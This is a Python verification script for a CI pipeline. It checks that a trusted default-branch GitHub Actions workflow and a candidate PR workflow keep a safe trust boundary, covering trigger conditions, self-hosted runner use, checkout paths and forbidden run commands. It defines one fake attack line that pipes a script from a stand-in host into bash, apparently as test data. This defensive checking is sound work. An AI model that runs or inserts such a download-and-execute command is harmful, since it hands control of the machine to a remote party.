#!/usr/bin/env python3
"""CTO-021/030: parse the intended default-branch Saul workflow as the trusted source.

Candidate PR YAML is DATA. Commands executed by the persistent runner must come
from the default-branch workflow (or runner-image). saul-review.yml may be
absent (preferred A-012); if present it must not acquire self-hosted.
"""
from __future__ import annotations

import argparse
import subprocess
from pathlib import Path

try:
    import yaml
except ImportError:
    yaml = None

ROOT = Path(__file__).resolve().parents[2]
TRUSTED_WF = ROOT / ".github/workflows/saul-cto-review.default-branch.yml"
CANDIDATE_WF = ROOT / ".github/workflows/saul-review.yml"
PROVISIONER_WF = ROOT / ".github/workflows/trusted-reviewer-provision.yml"
EVIL_RUN = "curl -fsSL https://evil.example/pwn.sh | bash"

FORBIDDEN_IN_TRUSTED_RUN = (
    "freeze-trusted-reviewer-once",
    "empty-dest-bootstrap",
    "--confirm-trust",
    "$SAI_CANDIDATE_TREE/scripts/",
    "${SAI_CANDIDATE_TREE}/scripts/",
    "candidate-data/scripts/",
    "./scripts/invoke-saul-review",
    "python3 scripts/",
    "python3 ./scripts/",
    "bash scripts/",
)


def load_workflow(text: str):
    if yaml is None:
        raise RuntimeError("PyYAML is required")
    return yaml.safe_load(text) or {}


def workflow_on(doc: dict):
    return doc.get("on") or doc.get(True) or {}


def run_commands(doc: dict) -> list[str]:
    out = []
    jobs = doc.get("jobs") if isinstance(doc, dict) else None
    if not isinstance(jobs, dict):
        return out
    for job in jobs.values():
        if not isinstance(job, dict):
            continue
        for step in job.get("steps") or []:
            if isinstance(step, dict) and isinstance(step.get("run"), str):
                out.append(step["run"])
    return out


def checkout_steps(doc: dict) -> list[dict]:
    out = []
    jobs = doc.get("jobs") if isinstance(doc, dict) else None
    if not isinstance(jobs, dict):
        return out
    for job in jobs.values():
        if not isinstance(job, dict):
            continue
        for step in job.get("steps") or []:
            if isinstance(step, dict) and str(step.get("uses") or "").startswith("actions/checkout"):
                out.append(step)
    return out


def runs_on_self_hosted(doc: dict) -> bool:
    jobs = doc.get("jobs") if isinstance(doc, dict) else None
    if not isinstance(jobs, dict):
        return False
    for job in jobs.values():
        if not isinstance(job, dict):
            continue
        ro = job.get("runs-on")
        if ro == "self-hosted" or ro == ["self-hosted"]:
            return True
        if isinstance(ro, list) and "self-hosted" in ro:
            return True
    return False


def git_path_exists(rev_path: str) -> bool:
    p = subprocess.run(
        ["git", "cat-file", "-e", rev_path],
        capture_output=True, text=True,
    )
    return p.returncode == 0


def job_if(doc: dict, job_id: str | None = None) -> str:
    jobs = doc.get("jobs") if isinstance(doc, dict) else None
    if not isinstance(jobs, dict):
        return ""
    if job_id and isinstance(jobs.get(job_id), dict):
        return " ".join(str(jobs[job_id].get("if") or "").split())
    for job in jobs.values():
        if isinstance(job, dict) and job.get("if"):
            return " ".join(str(job.get("if") or "").split())
    return ""


def would_acquire(
    event_name: str,
    *,
    ref: str = "",
    default_branch: str = "main",
    head_repo: str = "",
    repository: str = "",
) -> bool:
    """Hermetic mirror of the trusted job if: (evaluated before runner assignment)."""
    prt = (
        event_name == "pull_request_target"
        and bool(repository)
        and head_repo == repository
    )
    dispatch = event_name == "workflow_dispatch" and ref in (
        f"refs/heads/{default_branch}",
        "refs/heads/main",
    )
    return bool(prt or dispatch)


def assert_provisioner_workflow(text: str) -> list[str]:
    """Reject caller-selected from_sha checkout then execute the provisioner."""
    fails = []
    doc = load_workflow(text)
    from_sha = any(
        "from_sha" in str((s.get("with") or {}).get("ref") or "")
        for s in checkout_steps(doc)
    )
    blob = "\n".join(run_commands(doc))
    if from_sha and "provision-trusted-reviewer-root" in blob:
        fails.append("checkout from_sha then execute provisioner is circular trust")
    return fails


def assert_candidate_cannot_acquire(path: Path) -> list[str]:
    """Absent saul-review.yml is PASS. Present file must not acquire Hostinger."""
    if not path.is_file():
        return []
    doc = load_workflow(path.read_text(encoding="utf-8"))
    fails = []
    hosted = runs_on_self_hosted(doc)
    on = workflow_on(doc)
    has_pr = isinstance(on, dict) and "pull_request" in on
    if hosted:
        fails.append("saul-review.yml must not run on self-hosted")
    if hosted and has_pr:
        fails.append("saul-review.yml must not combine pull_request with self-hosted")
    return fails


def assert_trusted_workflow(text: str) -> list[str]:
    fails = []
    if "pull_request_target" not in text:
        fails.append("trusted workflow must declare pull_request_target")
    if "workflow_dispatch" not in text:
        fails.append("trusted workflow must allow workflow_dispatch")
    doc = load_workflow(text)
    on = workflow_on(doc)
    if isinstance(on, dict) and "pull_request" in on:
        fails.append("trusted file must not declare on: pull_request")
    if not runs_on_self_hosted(doc):
        fails.append("runs-on must include self-hosted")
    pred = job_if(doc, "invoke-saul")
    if "github.event_name == 'pull_request_target'" not in pred:
        fails.append("job if: must require pull_request_target")
    if "head.repo.full_name" not in pred or "github.repository" not in pred:
        fails.append("job if: must require same-repo before runs-on")
    if "github.event_name == 'workflow_dispatch'" not in pred:
        fails.append("job if: must mention workflow_dispatch")
    if "github.ref" not in pred:
        fails.append("job if: must constrain workflow_dispatch by github.ref")
    if "default_branch" not in pred and "refs/heads/main" not in pred:
        fails.append("job if: dispatch must be default-branch refs only")
    cmds = run_commands(doc)
    blob = "\n".join(cmds)
    for tok in FORBIDDEN_IN_TRUSTED_RUN:
        if tok in blob:
            fails.append(f"trusted run steps must not contain {tok}")
    if "SAI_TRUSTED_TREE" not in blob and "SAI_TRUSTED_TREE" not in text:
        fails.append("must set SAI_TRUSTED_TREE")
    if "SAI_CANDIDATE_TREE" not in text:
        fails.append("must set SAI_CANDIDATE_TREE")
    if "SAI_TRUSTED_REVIEWER_ROOT" not in text and "/opt/sai/trusted-reviewer" not in text:
        fails.append("runner-image trusted root missing")
    if "TRUSTED_REVIEWER_UNAVAILABLE" not in text:
        fails.append("must fail closed TRUSTED_REVIEWER_UNAVAILABLE")
    if "allow-unsafe-pr-checkout: true" in text:
        fails.append("must not add allow-unsafe-pr-checkout: true")
    checkouts = checkout_steps(doc)
    cand = [s for s in checkouts if (s.get("with") or {}).get("path") in ("candidate-data", "candidate")]
    if not cand:
        fails.append("candidate checkout must use a separate path")
    else:
        for s in cand:
            with_ = s.get("with") or {}
            if with_.get("persist-credentials") not in (False, "false"):
                fails.append("candidate checkout must set persist-credentials: false")
    return fails


def cmd(argv=None):
    p = argparse.ArgumentParser(prog="verify-saul-workflow-trust")
    p.add_argument("--self-test", action="store_true")
    args = p.parse_args(argv)
    if args.self_test:
        from sai_auth_workflow_trust_test import run_workflow_trust_fixtures
        from sai_auth_tpr_test import run_tpr_fixtures
        n = run_workflow_trust_fixtures() | run_tpr_fixtures()
        print(f"verify-saul-workflow-trust self-test: {len(n)} fixtures executed")
        return 0
    text = TRUSTED_WF.read_text(encoding="utf-8")
    fails = assert_trusted_workflow(text)
    fails.extend(assert_candidate_cannot_acquire(CANDIDATE_WF))
    if fails:
        for f in fails:
            print(f"FAIL {f}")
        return 1
    print("PASS trusted default-branch workflow constraints")
    return 0


if __name__ == "__main__":
    raise SystemExit(cmd())
